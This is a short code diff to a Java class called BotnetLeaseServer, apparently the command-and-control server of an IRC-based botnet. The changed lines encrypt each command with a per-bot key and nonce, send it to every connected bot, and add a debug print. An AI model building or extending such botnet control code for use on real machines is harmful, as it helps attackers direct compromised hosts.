@@ -347,7 +347,9 @@ public class BotnetLeaseServer extends PircBot {
 						if (!name.equals(NAME)) {
 							// TODO: encrypt command
 							//this.sendMessage(name, command);
-							sendMessage(name, botKeys.get(name).encryptMsg(command, getNonce(name)));
+							int nonce = getNonce(name);
+							System.out.println(botKeys.get(name).encryptMsg(command, nonce));
+							sendMessage(name, botKeys.get(name).encryptMsg(command, nonce));
 						}
 					}
 				}
